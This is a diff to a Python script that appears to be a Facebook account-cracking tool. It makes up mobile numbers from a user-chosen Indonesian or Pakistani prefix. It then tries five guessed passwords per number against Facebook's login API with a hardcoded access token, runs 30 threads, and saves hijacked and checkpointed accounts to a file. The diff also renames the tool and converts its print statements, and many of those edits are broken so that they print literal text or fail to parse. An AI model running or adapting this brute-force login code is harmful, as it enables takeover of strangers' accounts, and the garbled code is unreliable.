@@ -175,23 +175,23 @@ def pilih_logine():
         Zeek()
 def Zeek():
     os.system('clear')
-    print logo1
-    print '\x1b[1;91m[1] M&F Start Cracking'
+    print("logo1")
+    print('\x1b[1;91m[1] M&F MULAI CRACK/Start Crack')
     time.sleep(0.05)
-    print '\x1b[1;92m[0] \033[1;93m Back'
+    print('\x1b[1;92m[0] \033[1;93m Kembali/Back')
     time.sleep(0.05)
     action()
 
 def action():
     peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
     if peak =='':
-        print '[!] Fill In Correctly'
+        print('[!] Fill In Correctly')
         action()
     elif peak =="1":              
         os.system("clear")
-        print logo2
-        print "Enter any Indonesia&Pakistan Mobile code Number"+'\n'
-        print ' Enter any code 1 to 49'
+        print("logo2")
+        print("Enter any Indonesia&Pakistan Mobile code Number"+'\n')
+        print(' Enter any code 1 to 49')
         try:
             c = raw_input("\033[1;96mCHOOSE : ")
             k="03"
@@ -205,15 +205,15 @@ def action():
     elif peak =='0':
         login()
     else:
-        print '[!] Fill In Correctly'
+        print('[!] Fill In Correctly')
         action()
-    print 50* '\033[1;91m-'
+    print("50* '\033[1;91m-'")
     xxx = str(len(id))
     jalan ('\033[1;91m Total ids number: '+xxx)
     jalan ('\033[1;93mCode you choose: '+c)
     jalan ("\033[1;95mM&F $ total 5 password will clone ^M&F-^M&F-^M&F-^M&F-^M&F-^M&F11 digit , last 7 digit, indonesia&pakistan, 000786, 786786 password Start Cracking...")
     jalan ("\033[1;96mTo Stop Process Press Ctrl+z")
-    print 50* '\033[1;92m-'
+    print("50* '\033[1;92m-'")
     def main(arg):
         global cp,ok
         user = arg
@@ -226,14 +226,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m(OK)  ' + k + c + user + '  |  ' + pass1                                       
+                print("'\x1b[1;91m(OK)  ' + k + c + user + '  |  ' + pass1  ")
                 ok = open('save/cloned.txt', 'a')
                 ok.write(k+c+user+pass1+'\n')
                 ok.close()
                 ok.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;91m(CP) ' + k + c + user + '  |  ' + pass1
+                    print("'\033[1;91m(CP) ' + k + c + user + '  |  ' + pass1  ")
                     cp = open('save/cloned.txt', 'a')
                     cp.write(k+c+user+pass1+'\n')
                     cp.close()
@@ -243,14 +243,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;93m(OK)  ' + k + c + user +  '  |  ' + pass2
+                        print("'\x1b[1;93m(OK)  ' + k + c + user +  '  |  ' + pass2  ")
                         ok = open('save/cloned.txt', 'a')
                         ok.write(k+c+user+pass2+'\n')
                         ok.close()
                         ok.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;93m(CP) ' + k + c + user + '  |  ' + pass2
+                            print("'\033[1;93m(CP) ' + k + c + user + '  |  ' + pass2  ")
                             cp = open('save/cloned.txt', 'a')
                             cp.write(k+c+user+pass2+'\n')
                             cp.close()
@@ -260,14 +260,14 @@ def action():
                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                             q = json.load(data)
                             if 'access_token' in q:
-                                print '\x1b[1;95m(OK)  ' + k + c + user + '  |  ' + pass3
+                                print("'\x1b[1;95m(OK)  ' + k + c + user + '  |  ' + pass3  ")
                                 ok = open('save/cloned.txt', 'a')
                                 ok.write(k+c+user+pass3+'\n')
                                 ok.close()
                                 ok.append(c+user+pass3)
                             else:
                                 if 'www.facebook.com' in q['error_msg']:
-                                    print '\033[1;95m(CP) ' + k + c + user + '  |  ' + pass3 
+                                    print("'\033[1;95m(CP) ' + k + c + user + '  |  ' + pass3  ")
                                     cp = open('save/cloned.txt', 'a')
                                     cp.write(k+c+user+pass3+'\n')
                                     cp.close()
@@ -277,14 +277,14 @@ def action():
                                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                     q = json.load(data)
                                     if 'access_token' in q:
-                                        print '\x1b[1;96m(OK)  ' + k + c + user + '  |  ' + pass4 
+                                        print("'\x1b[1;96m(OK)  ' + k + c + user + '  |  ' + pass4  ")
                                         ok = open('save/cloned.txt', 'a')
                                         ok.write(k+c+user+pass4+'\n')
                                         ok.close()
                                         ok.append(c+user+pass4)
                                     else:
                                         if 'www.facebook.com' in q['error_msg']:
-                                            print '\033[1;96m(CP) ' + k + c + user + '  |  ' + pass4
+                                            print("'\033[1;96m(CP) ' + k + c + user + '  |  ' + pass4  ")
                                             cp = open('save/cloned.txt', 'a')
                                             cp.write(k+c+user+pass4+'\n')
                                             cp.close()
@@ -294,14 +294,14 @@ def action():
                                             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                             q = json.load(data)
                                             if 'access_token' in q:
-                                                print '\x1b[1;94m(OK)  ' + k + c + user + '  |  ' + pass5
+                                                print("'\x1b[1;94m(OK)  ' + k + c + user + '  |  ' + pass5  ")
                                                 ok. = open('save/cloned.txt', 'a')
                                                 ok.write(k+c+user+pass5+'\n')
                                                 ok.close()
                                                 ok.append(c+user+pass5)
                                             else:
                                                 if 'www.facebook.com' in q['error_msg']:
-                                                    print '\033[1;94m(CP) ' + k + c + user + '  |  ' + pass5 
+                                                    print("'\033[1;94m(CP) ' + k + c + user + '  |  ' + pass5  ")
                                                     cp = open('save/cloned.txt', 'a')
                                                     cp .write(k+c+user+pass5+'\n')
                                                     cp .close()
@@ -326,13 +326,13 @@ def action():
         
     p = ThreadPool(30)
     p.map(main, id)
-    print 50* '\033[1;91m-'
-    print 'BlackTiger Process Has Been Completed^M&F-^M&F-^M&F-^M&F-M&F-M&F...100%'
-    print 'Total OKAY/CHECKPOINT : '+str(len(oks))+'/'+str(len(cp))
-    print('BlackTiger Cloned Accounts Has Been Saved : save/cloned.txt')
+    print("50* '\033[1;91m-'")
+    print('Milzu&Firdoos Process Has Been Completed^M&F-^M&F-^M&F-^M&F-M&F-M&F...100%')
+    print('Total OKAY/CHECKPOINT : '+str(len(oks))+'/'+str(len(cp))
+    print('Milzu&Firdoos Cloned Accounts Has Been Saved : save/cloned.txt')
     jalan("Note : Your M&F (CP)Accounts Open after 5 to 8 days")
-    print ''
-    print """
+    print()
+    print(""")
     
     
     
